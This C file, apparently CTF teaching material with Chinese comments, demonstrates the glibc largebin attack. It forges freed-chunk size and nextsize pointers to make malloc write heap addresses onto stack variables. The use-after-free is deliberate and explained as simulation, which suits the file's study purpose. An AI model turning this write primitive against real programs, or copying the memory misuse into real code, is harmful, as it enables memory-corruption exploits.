/*
 * House of Fun 是旧 largebin attack 的历史命名。本文件复用同一条真实
 * glibc 路径：请重点观察 2.30 新增检查前，四个双链/nextsize 指针如何
 * 参与写入。成功判据与下方原 PoC 相同。
 */
/*
 * 中文导读（CTF 版）
 *
 * 手法：large_bin_attack
 * 文件标注范围：2.23 ~ 2.29
 * 模拟漏洞：UAF 改写已入 largebin 节点的 bk_nextsize。
 * 核心流程：插入更小 victim 时走最小节点分支，将 victim 地址写入 fake->fd_nextsize 指向的目标。
 * 成功判据：target 等于新 victim 的 chunk 头；2.30 前后所需链字段不同，2.42 新增 nextsize 反向检查后经典写原语失效。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

/*

    本例改编自以下 largebin 研究：
    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/

    [...]

              以下是插入到排序链中的“否则”分支：else
              {
                  victim->fd_nextsize = fwd;
                  victim->bk_nextsize = fwd->bk_nextsize;
                  fwd->bk_nextsize = victim;
                  victim->bk_nextsize->fd_nextsize = victim;
              }
              bck = fwd->bk;

    [...]

    mark_bin (av, victim_index);
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim;

    若要进一步理解 ptmalloc 如何组织和排序 largebin，请阅读上述文章的
    背景章节，并同时对照目标版本 malloc.c 中的 _int_malloc 实现。

    [...]

 */

#include<stdio.h>
#include<stdlib.h>
#include<assert.h>
 
int main()
{

    unsigned long stack_var1 = 0;
    unsigned long stack_var2 = 0;

    /* p1、p2、p3 均超过 smallbin 范围；每个大块后放一个 0x20 guard，
       防止释放时与相邻 chunk 或 top 合并。 */
    unsigned long *p1 = malloc(0x420);

    malloc(0x20);

    unsigned long *p2 = malloc(0x500);

    malloc(0x20);

    unsigned long *p3 = malloc(0x500);

    malloc(0x20);
 
    free(p1);
    free(p2);

    // 触发 unsorted-bin 扫描，把 p1、p2 归入 largebin 并建立两套链指针。
    malloc(0x90);

    // p3 暂留在 unsorted bin，下一次 malloc 时会把它插入现有 largebin。
    free(p3);

    /* 漏洞模拟：伪造 p2 的 size、fd/bk 与 fd_nextsize/bk_nextsize。
       旧版插入逻辑会分别执行两次反向指针写，从而改写 stack_var1/2。 */
    p2[-1] = 0x3f1;
    p2[0] = 0;
    p2[2] = 0;
    p2[1] = (unsigned long)(&stack_var1 - 2);
    p2[3] = (unsigned long)(&stack_var2 - 4);

    // 触发 p3 的 largebin 插入，消费上面伪造的四个链字段。
    malloc(0x90);

    // 严格检查两处目标均已被写入，避免只打印地址造成假阳性。
    assert(stack_var1 != 0);
    assert(stack_var2 != 0);

    return 0;
}
